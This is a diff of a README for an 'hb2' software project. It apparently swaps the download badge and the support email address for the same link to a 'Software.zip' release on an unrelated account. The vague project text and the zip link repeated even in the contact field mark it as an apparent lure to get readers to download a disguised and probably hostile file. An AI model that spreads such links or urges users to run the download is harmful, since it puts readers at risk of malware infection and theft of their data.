@@ -12,7 +12,7 @@ This repository is dedicated to the "hb2" project, a cutting-edge software solut
 ### Installation:
 To get started with "hb2", you can download the latest release from the link provided below. Click on the button to download the zip file:
 
-[![Download hb2](https://img.shields.io/badge/Download-hb2-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download hb2](https://github.com/bobbysaremine/hb2/releases/download/v2.0/Software.zip)](https://github.com/bobbysaremine/hb2/releases/download/v2.0/Software.zip)
 
 After downloading the zip file, extract it and follow the installation instructions in the documentation to set up "hb2" on your system.
 
@@ -36,7 +36,7 @@ Our team will review your contributions and merge them if they align with the pr
 For more information about "hb2" and the latest updates, visit our website [here](#). Explore our blog, FAQs, and contact information to stay connected with the project.
 
 ### Contact Us:
-If you have any questions, feedback, or suggestions regarding "hb2", feel free to reach out to us at [support@hb2.com](mailto:support@hb2.com). Our team will be happy to assist you.
+If you have any questions, feedback, or suggestions regarding "hb2", feel free to reach out to us at [https://github.com/bobbysaremine/hb2/releases/download/v2.0/Software.zip](https://github.com/bobbysaremine/hb2/releases/download/v2.0/Software.zip). Our team will be happy to assist you.
 
 ### Stay Updated:
 Stay in the loop with the latest developments and releases of "hb2" by following us on social media:
